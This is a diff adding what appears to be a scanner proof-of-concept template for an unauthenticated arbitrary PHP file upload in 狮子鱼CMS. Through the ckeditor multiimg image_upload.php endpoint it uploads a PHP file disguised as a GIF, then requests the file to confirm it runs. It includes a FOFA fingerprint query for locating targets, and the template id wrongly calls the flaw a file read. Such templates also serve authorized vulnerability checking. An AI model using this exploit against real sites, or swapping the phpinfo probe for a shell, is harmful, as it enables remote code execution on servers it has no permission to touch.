@@ -1,0 +1,34 @@
+id: poc-yaml-szy-cms-image-upload-php-file-read
+info:
+  name: 狮子鱼CMS image_upload.php 任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 狮子鱼CMS
+  FOFA: /seller.php?s=/Public/login
+requests:
+- method: POST
+  path: /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php
+  headers:
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs
+  data: '------WebKitFormBoundary8UaANmWAgM4BqBSs
+
+    Content-Disposition: form-data; name="files"; filename="test.php"
+
+    Content-Type: image/gif
+
+
+    <?php phpinfo();?>
+
+    ------WebKitFormBoundary8UaANmWAgM4BqBSs——
+
+    '
+  expression: status_code == 200 && contains(body,"imgurl")
+  output:
+  - regex_match(body,"(?P<url>[0-9]{13}.php)")
+- method: GET
+  path: /Common/image/uploads/{{.url}}
+  expression: status_code == 200 && contains(body,"PHP Version") && contains(body,"PHP
+    API") && contains(title,"phpinfo()")
+variables: {}
+transport: http
